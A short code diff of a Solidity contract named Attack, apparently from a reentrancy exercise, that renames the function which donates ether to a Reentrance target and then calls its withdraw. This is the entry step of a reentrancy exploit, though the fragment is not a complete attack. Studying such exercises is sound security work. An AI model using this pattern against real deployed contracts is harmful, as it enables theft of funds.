@@ -11,7 +11,7 @@ contract Attack {
         reentrance = Reentrance(target);
     }
 
-    function drawall() public payable {
+    function withdrawal() public payable {
         reentrance.donate{value: msg.value}(address(this));
         reentrance.withdraw(1 ether);
 
